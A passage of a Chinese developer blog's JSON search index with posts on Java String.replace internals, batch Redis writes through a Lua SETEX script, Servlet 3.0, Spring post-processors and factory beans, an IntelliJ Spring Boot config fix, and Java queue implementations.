char)\"></a>方法<code>java.lang.String#replace(char, char)</code></h3><p>入参为char，源码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> String <span class=\"title function_\">replace</span><span class=\"params\">(<span class=\"type\">char</span> oldChar, <span class=\"type\">char</span> newChar)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//判断传入的oldChar和newChar是否一致，如果不一样开始做替换</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (oldChar != newChar) &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">len</span> <span class=\"operator\">=</span> value.length;</span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> -<span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"type\">char</span>[] val = value; <span class=\"comment\">/* 避免使用 getfield 操作码 */</span></span><br><span class=\"line\">        <span class=\"comment\">//获取第一个匹配需要替换的字符</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> (++i &lt; len) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (val[i] == oldChar) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">//判断是否匹配上，如果匹配上开始做替换，如果未匹配上，直接返回this</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (i &lt; len) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//构造一个新字符数组，长度数据和原有一致</span></span><br><span class=\"line\">            <span class=\"type\">char</span> buf[] = <span class=\"keyword\">new</span> <span class=\"title class_\">char</span>[len];</span><br><span class=\"line\">            <span class=\"comment\">//把第一个匹配上的前面数据赋值到新数组中</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">j</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; j &lt; i; j++) &#123;</span><br><span class=\"line\">                buf[j] = val[j];</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">//遍历数组后续，如果匹配上替换为新字符</span></span><br><span class=\"line\">            <span class=\"keyword\">while</span> (i &lt; len) &#123;</span><br><span class=\"line\">                <span class=\"type\">char</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> val[i];</span><br><span class=\"line\">                buf[i] = (c == oldChar) ? newChar : c;</span><br><span class=\"line\">                i++;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">//通过字符数组构建一个新字符串</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">String</span>(buf, <span class=\"literal\">true</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//如果传入参数一样，直接返回当前字符串对象</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n<p>总结：<br>1、如果传入的参数被替换字符、替换一致，直接返回当前字符串对象，如果被替换字符不在当前字符串内，也直接返回当前字符串对象。<br>2、遍历旧字符数组，通过一个新字符数组存储替换后的字符，返回一个新构建的字符串对象。</p>\n<h3 id=\"方法java-lang-String-replace-java-lang-CharSequence-java-lang-CharSequence\"><a href=\"#方法java-lang-String-replace-java-lang-CharSequence-java-lang-CharSequence\" class=\"headerlink\" title=\"方法java.lang.String#replace(java.lang.CharSequence, java.lang.CharSequence)\"></a>方法<code>java.lang.String#replace(java.lang.CharSequence, java.lang.CharSequence)</code></h3><p>入参为两个<code>java.lang.CharSequence</code>。源码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> String <span class=\"title function_\">replace</span><span class=\"params\">(CharSequence target, CharSequence replacement)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//通过正则表达式替换，被替换字符串使用Pattern.LITERAL模式，表示输入的字符串都视为字面值，对于元字符或转义序列无任何意义</span></span><br><span class=\"line\">    <span class=\"comment\">//替换的字符串，使用Matcher.quoteReplacement处理，也就是对\\和$处理，如果存在这两个字符，那么对其进行转译</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> Pattern.compile(target.toString(), Pattern.LITERAL).matcher(</span><br><span class=\"line\">            <span class=\"built_in\">this</span>).replaceAll(Matcher.quoteReplacement(replacement.toString()));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>总结：<br>1、替换字符串是从前往后开始替换，如果先匹配先替换<br>2、通过Pattern纯粹的字符串替换，对于<strong>targe</strong>，使用了<code>Pattern.LITERAL</code>（纯粹视为字符），对于<strong>replacement</strong>使用了<code>Matcher.quoteReplacement</code>（对与\\和$做转译处理）。</p>\n<h3 id=\"方法java-lang-String-replaceAll\"><a href=\"#方法java-lang-String-replaceAll\" class=\"headerlink\" title=\"方法java.lang.String#replaceAll\"></a>方法<code>java.lang.String#replaceAll</code></h3><p>入参为两个<code>String</code>。源码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> String <span class=\"title function_\">replaceAll</span><span class=\"params\">(String regex, String replacement)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Pattern.compile(regex).matcher(<span class=\"built_in\">this</span>).replaceAll(replacement);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>直接通过传入的正则表达式进行全部的替换。</p>\n<h3 id=\"方法java-lang-String-replaceFirst\"><a href=\"#方法java-lang-String-replaceFirst\" class=\"headerlink\" title=\"方法java.lang.String#replaceFirst\"></a>方法<code>java.lang.String#replaceFirst</code></h3><p>入参为两个<code>String</code>。源码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> String <span class=\"title function_\">replaceFirst</span><span class=\"params\">(String regex, String replacement)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Pattern.compile(regex).matcher(<span class=\"built_in\">this</span>).replaceFirst(replacement);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>一样通过正则表达式进行替换，只不过只替换第一个匹配上的。</p>\n","categories":["Java基础"],"tags":["String"]},{"title":"redis使用lua脚本批量操作","url":"/2020/04/21/redis%E4%BD%BF%E7%94%A8lua%E8%84%9A%E6%9C%AC%E6%89%B9%E9%87%8F%E6%93%8D%E4%BD%9C/","content":"<p>前言：本来项目中使用的redis采用的是集群模式，之后改为了哨兵模式。<br>今天在缓存平台上查看缓存，发现命中率非常低，缓存中key非常少，之前集群模式应该有即使上百万的key，现在就几百。几番排查后发现在集群模式下使用了<code>mset</code>可以正常批量写入数据，之后通过<code>mexpire</code>批量设置失效时间。改为哨兵模式后，<code>mset</code>无法使用。<br>业务中如果缓存没命中会直接查询数据库，所有在测试时并未发现什么问题。</p>\n<p>确实哨兵模式下，也有对应的<code>mset</code>，但是该模式下没有批量设置失效时间，只能使用lua脚本对数据进行操作。</p>\n<span id=\"more\"></span>\n<h3 id=\"添加脚本到redis服务器\"><a href=\"#添加脚本到redis服务器\" class=\"headerlink\" title=\"添加脚本到redis服务器\"></a>添加脚本到redis服务器</h3><p>使用方法<code>scriptLoad</code>传入脚本和key，key不变方便后续直接使用。<br>在启动项目时即可传入脚本，获取返回的sha(用于唯一标识脚本，如果传入的key一样，返回的值不会变，方便后续使用，脚本如果上传成功后会永久保存在服务器)，保存改sha用于后续调用该脚本。<br>批量写入数据同时设置失效时间脚本如下：</p>\n<figure class=\"highlight lua\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> index, value <span class=\"keyword\">in</span> <span class=\"built_in\">ipairs</span>(KEYS)</span><br><span class=\"line\">    <span class=\"keyword\">do</span></span><br><span class=\"line\">        redis.call(<span class=\"string\">&#x27;SETEX&#x27;</span>, KEYS[index], ARGV[index*<span class=\"number\">2</span><span class=\"number\">-1</span>], ARGV[index*<span class=\"number\">2</span>])</span><br><span class=\"line\">    <span class=\"keyword\">end</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>脚本中<code>KEYS</code>用于获取传入的key，脚本中<code>ARGV</code>用于获取传入的参数</li>\n</ul>\n<p>循环遍历传入的<code>KEYS</code>，调用命令<code>SETEX</code>设置该key的值以及key的失效时间。</p>\n<h3 id=\"调用脚本\"><a href=\"#调用脚本\" class=\"headerlink\" title=\"调用脚本\"></a>调用脚本</h3><p>方法<code>evalsha(final String sha1, final List&lt;String&gt; keys, final List&lt;String&gt; args)</code>调用脚本。<br>第一个参数为之前上传lua脚本返回的sha，第二个为需要操作的key，第三个为传入的参数(失效时间和值交替放入list)</p>\n<ul>\n<li>缓存平台使用的开源sohutv&#x2F;cachecloud</li>\n<li>集群模式下<code>mset</code>为<code>String mset(final Map&lt;String, String&gt; keyValueMap)</code>，哨兵模式下为<code>String mset(String... keysvalues)</code>key和val交替。</li>\n</ul>\n","categories":["线上BUG"],"tags":["redis"]},{"title":"Servlet 3.0基本信息","url":"/2020/06/01/Servlet-3-0%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF/","content":"<p>Servelt 3.0在2009年已经随着JavaEE 6推出。主要增加了异步处理、注解支持、模块化处理</p>\n<h3 id=\"异步支持\"><a href=\"#异步支持\" class=\"headerlink\" title=\"异步支持\"></a>异步支持</h3><p>在之前Servelt在接收到请求后需要处理完毕后再做返回，线程一直在阻塞状态，现在可以接收数据后交由其他线程处理，线程接收线程本身返回容器。如果聊天中等待消息。<br>在<strong>WebServlet</strong>设置<strong>asyncSupported</strong>为true即可(默认为false)</p>\n<span id=\"more\"></span>\n<h3 id=\"模块化支持\"><a href=\"#模块化支持\" class=\"headerlink\" title=\"模块化支持\"></a>模块化支持</h3><p>支持在容器启动后可以动态在<strong>ServletContext</strong>中添加<strong>Servelt</strong>，在SpringBoot中内嵌Tomcat，在启动Tomcat后，通过动态添加<strong>DispatcherServlet</strong>到容器中。</p>\n<p>参考：</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaWJtLmNvbS9kZXZlbG9wZXJ3b3Jrcy9jbi9qYXZhL2otbG8tc2VydmxldDMwL2luZGV4Lmh0bWw=\">Servlet 3.0 新特性详解<i class=\"fa fa-external-link-alt\"></i></span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3JhY2xlLmNvbS90ZWNobmV0d29yay9jbi9jb21tdW5pdHkvNC1zZXJ2bGV0LTMtMzI0MzAyLXpocy5wZGY=\">JavaEE 6 Servlet 3.0 中的新特性<i class=\"fa fa-external-link-alt\"></i></span></li>\n</ul>\n","categories":["Servelt"],"tags":["Servelt 3.0"]},{"title":"Spring中BeanFactoryPostProcessor、BeanPostProcessor","url":"/2020/06/01/Spring%E4%B8%ADBeanFactoryPostProcessor%E3%80%81BeanPostProcessor/","content":"<h3 id=\"BeanFactoryPostProcessor\"><a href=\"#BeanFactoryPostProcessor\" class=\"headerlink\" title=\"BeanFactoryPostProcessor\"></a>BeanFactoryPostProcessor</h3><p>实现改接口，可以在Bean创建前，修改Bean定义的对象（元数据），也就是定义Bean的相关信息。但是需要注意的是，不可以在该实现里面触发Bean的实例化操作。可能会导致其他意想不到的问题。文档中有注释，如果需要与构建的Bean有交互的话使用<strong>BeanPostProcessor</strong></p>\n<h3 id=\"BeanPostProcessor\"><a href=\"#BeanPostProcessor\" class=\"headerlink\" title=\"BeanPostProcessor\"></a>BeanPostProcessor</h3><p>该接口有两个方法。一个为执行Bean的init方法之前，一个是之后，在该过程中可以对该Bean进行修改操作。</p>\n<span id=\"more\"></span>\n<p>如果现在某个Bean的处理有上面两个实现，整个流程如下：</p>\n<blockquote>\n<p>1、Spring读取配置文件，构建BeanFactoryPostProcessor，构建Bean的定义（元数据）<br>2、执行BeanFactoryPostProcessor中实现方法<br>3、创建Bean<br>4、执行BeanPostProcessor中postProcessBeforeInitialization<br>5、执行Bean中init方法<br>6、执行BeanPostProcessor中postProcessAfterInitialization</p>\n</blockquote>\n","categories":["Spring"],"tags":["BeanFactoryPostProcessor","BeanPostProcessor"]},{"title":"Spring中BeanFactory、FactoryBean、ObjectFactory","url":"/2020/06/01/Spring%E4%B8%ADBeanFactory%E3%80%81FactoryBean%E3%80%81ObjectFactory/","content":"<h3 id=\"BeanFactory\"><a href=\"#BeanFactory\" class=\"headerlink\" title=\"BeanFactory\"></a>BeanFactory</h3><p>是Spring IOC容器定义的跟接口，用于获取Bean。</p>\n<h3 id=\"FactoryBean\"><a href=\"#FactoryBean\" class=\"headerlink\" title=\"FactoryBean\"></a>FactoryBean</h3><p>是一个Bean，只不过是一个工厂Bean，在BeanFactory需要获取Bean的时候，通过FactoryBean来生成对象返回，如果是单例，缓存生成的对象。如果需要获取的是FactoryBean而不是FactoryBean生成Bean时，需要在Bean的名称上面加一个**&amp;**</p>\n<span id=\"more\"></span>\n<h3 id=\"ObjectFactory\"><a href=\"#ObjectFactory\" class=\"headerlink\" title=\"ObjectFactory\"></a>ObjectFactory</h3><p>也是用于生成Bean，只不过生成Bean的时间由自己把握<br>在BeanFactory.getBean的时候，是通过FactoryBean生成Bean返回<br>如果需要生成的Bean又ObjectFactory构建，那么需要先获取ObjectFactory之后再调用ObjectFactory.getObject</p>\n<p>ObjectFactory和FactoryBean区部在生成Bean的时机不同</p>\n","categories":["Spring"],"tags":["BeanFactory","FactoryBean","ObjectFactory"]},{"title":"IDEA关于SpringBoot配置文件提示失效","url":"/2020/06/11/IDEA%E5%85%B3%E4%BA%8ESpringBoot%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%8F%90%E7%A4%BA%E5%A4%B1%E6%95%88/","content":"<p>使用IDEA开发SpringBoot项目，有时候在导入项目后，写配置文件无提示。<br>可以正常提示的<strong>application.properties</strong>为一个绿叶图标，不能正常提示的图标为普通<strong>properties</strong>图标。</p>\n<span id=\"more\"></span>\n<p>如下：</p>\n<blockquote>\n<p>正常<br><img src=\"/images/old/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202020-06-11%20%E4%B8%8A%E5%8D%8810.01.51.png\" alt=\"正常图标\"></p>\n</blockquote>\n<blockquote>\n<p>普通<br><img src=\"/images/old/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202020-06-11%20%E4%B8%8A%E5%8D%8810.01.40.png\" alt=\"普通图标\"></p>\n</blockquote>\n<p>正常修复应该是对项目按<strong>F4</strong>打开moudle设置，如果没有Spring，添加Spring支持<br>如下：</p>\n<blockquote>\n</blockquote>\n<p><img src=\"/images/old/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202020-06-11%20%E4%B8%8A%E5%8D%8810.14.26.png\" alt=\"Spring支持\"></p>\n<p>之后点击Spring，截图如下：</p>\n<blockquote>\n</blockquote>\n<p><img src=\"/images/old/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202020-06-11%20%E4%B8%8A%E5%8D%8810.18.42.png\"></p>\n<p>是没有spring的配置的，表示当前项目SpringBoot配置文件无法正确识别，可以正常的识别应该为如下：</p>\n<blockquote>\n</blockquote>\n<p><img src=\"/images/old/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202020-06-11%20%E4%B8%8A%E5%8D%8810.19.48.png\"></p>\n<p>查询资料后，正常应该点击下方绿叶按钮然后添加配置文件<br><img src=\"/images/old/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202020-06-11%20%E4%B8%8A%E5%8D%8810.21.10.png\"></p>\n<ul>\n<li>windows系统好像在上面</li>\n</ul>\n<p>不知道为什么一直提示有误，无法点击确认如下：<br><img src=\"/images/old/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202020-06-11%20%E4%B8%8A%E5%8D%8810.22.10.png\"></p>\n<p>在网上查询一圈资料未解决后，通过找正常项目下的iml文件和无法正常提示的iml文件得到，如果直接在iml里面添加配置即可解决，<br>在iml文件里面填写如下：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">facet</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;Spring&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;Spring&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">configuration</span> <span class=\"attr\">spring_boot_spring_config_custom_files</span>=<span class=\"string\">&quot;file://$MODULE_DIR$/src/main/resources/application.properties;file://$MODULE_DIR$/src/main/resources/config/local/application.properties&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">facet</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>重点是<strong>spring_boot_spring_config_custom_files</strong>，后面添加配置文件路径，如果有多个文件需要提示可以通过分号分隔</p>\n","categories":["IDEA"],"tags":["配置文件提示"]},{"title":"Java基础-Queue（1）","url":"/2020/11/02/Java%E5%9F%BA%E7%A1%80-Queue-1/","content":"<h3 id=\"定义\"><a href=\"#定义\" class=\"headerlink\" title=\"定义\"></a>定义</h3><p>一般情况下，队列为一种先进先出的线性表。队列只允许在尾端插入数据，前端删除数据。也存在双端队列，可以在头部和尾部进行插入删除数据。</p>\n<span id=\"more\"></span>\n<h3 id=\"队列实现\"><a href=\"#队列实现\" class=\"headerlink\" title=\"队列实现\"></a>队列实现</h3><h4 id=\"链表实现\"><a href=\"#链表实现\" class=\"headerlink\" title=\"链表实现\"></a>链表实现</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 自定义队列</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Queue</span>&lt;T&gt; &#123;</span><br><span class=\"line\">    <span class=\"comment\">//队列头部</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> Node&lt;T&gt; head;</span><br><span class=\"line\">    <span class=\"comment\">//队列尾部</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> Node&lt;T&gt; tail;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 添加数据到队列</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> val 数据</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span> 是否添加成功</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">offer</span><span class=\"params\">(T val)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">         * 判断尾节点是否为空</span></span><br><span class=\"line\"><span class=\"comment\">         * 空：表示队列无数据，设置首尾节点为当前节点</span></span><br><span class=\"line\"><span class=\"comment\">         * 非空：放入链表尾部</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        Node&lt;T&gt; node = <span class=\"keyword\">new</span> <span class=\"title class_\">Node</span>&lt;&gt;(val);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (tail == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            head = node;</span><br><span class=\"line\">            tail = node;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            tail.next = node;</span><br><span class=\"line\">            tail = node;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 去除队列数据</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span> 队列数据，如果不存在返回null</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> T <span class=\"title function_\">poll</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        Node&lt;T&gt; node;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (head == tail) &#123;</span><br><span class=\"line\">            node = head;</span><br><span class=\"line\">            head = <span class=\"literal\">null</span>;</span><br><span class=\"line\">            tail = <span class=\"literal\">null</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            node = head;</span><br><span class=\"line\">            head = head.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> node == <span class=\"literal\">null</span> ? <span class=\"literal\">null</span> : node.val;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 队列的节点，一个链表</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Node</span>&lt;T&gt; &#123;</span><br><span class=\"line\">    <span class=\"comment\">//下一个节点</span></span><br><span class=\"line\">    Node&lt;T&gt; next;</span><br><span class=\"line\">    <span class=\"comment\">//节点值</span></span><br><span class=\"line\">    T val;</span><br><span class=\"line\"></span><br><span class=\"line\">    Node(T val) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.val = val;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Demo</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        Queue&lt;Integer&gt; queue = <span class=\"keyword\">new</span> <span class=\"title class_\">Queue</span>&lt;&gt;();</span><br><span class=\"line\">        queue.offer(<span class=\"number\">1</span>);</span><br><span class=\"line\">        queue.offer(<span class=\"number\">2</span>);</span><br><span class=\"line\">        queue.offer(<span class=\"number\">3</span>);</span><br><span class=\"line\">        Integer num;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> ((num = queue.poll()) != <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">            System.out.println(num);<span class=\"comment\">//输出顺序为1、2、3</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"数组实现\"><a href=\"#数组实现\" class=\"headerlink\" title=\"数组实现\"></a>数组实现</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 自定义队列 数组实现</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Queue</span>&lt;T&gt; &#123;</span><br><span class=\"line\">    <span class=\"comment\">//固定队列大小</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> Object[] data;</span><br><span class=\"line\">    <span class=\"comment\">//头</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">int</span> head;</span><br><span class=\"line\">    <span class=\"comment\">//尾</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">int</span> tail;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Queue</span><span class=\"params\">(<span class=\"type\">int</span> size)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (size &lt;= <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">IllegalArgumentException</span>(<span class=\"string\">&quot;队列长度不能小于等于1&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        data = <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[size];</span><br><span class=\"line\">        head = <span class=\"number\">0</span>;</span><br><span class=\"line\">        tail = <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 添加</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> t 数据</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span> 是否添加成功</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">offer</span><span class=\"params\">(T t)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 队列中无数据</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (head == tail &amp;&amp; data[head] == <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">            data[head] = t;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">next</span> <span class=\"operator\">=</span> (tail + <span class=\"number\">1</span>) % data.length;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (data[next] != <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        data[next] = t;</span><br><span class=\"line\">        tail = next;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 获取队列数据</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span> 数据</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> T <span class=\"title function_\">poll</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">res</span> <span class=\"operator\">=</span> data[head];</span><br><span class=\"line\">        data[head] = <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"comment\">//队列中并非只有一个数据时</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (head != tail)&#123;</span><br><span class=\"line\">            head = (head + <span class=\"number\">1</span>) % data.length;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> res == <span class=\"literal\">null</span>? <span class=\"literal\">null</span>: (T)res;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Demo</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        Queue&lt;Integer&gt; queue = <span class=\"keyword\">new</span> <span class=\"title class_\">Queue</span>&lt;&gt;(<span class=\"number\">5</span>);</span><br><span class=\"line\">        queue.offer(<span class=\"number\">1</span>);</span><br><span class=\"line\">        queue.offer(<span class=\"number\">2</span>);</span><br><span class=\"line\">        queue.offer(<span class=\"number\">3</span>);</span><br><span class=\"line\">        Integer num;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> ((num = queue.poll()) != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            System.out.println(num);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        queue.offer(<span class=\"number\">4</span>);</span><br><span class=\"line\">        queue.offer(<span class=\"number\">5</span>);</span><br><span class=\"line\">        queue.offer(<span class=\"number\">6</span>);</span><br><span class=\"line\">        queue.offer(<span class=\"number\">7</span>);</span><br><span class=\"line\">        queue.offer(<span class=\"number\">8</span>);</span><br><span class=\"line\">        queue.offer(<span class=\"number\">9</span>);</span><br><span class=\"line\">        <span class=\"keyword\">while</span> ((num = queue.poll()) != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            System.out.println(num);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span 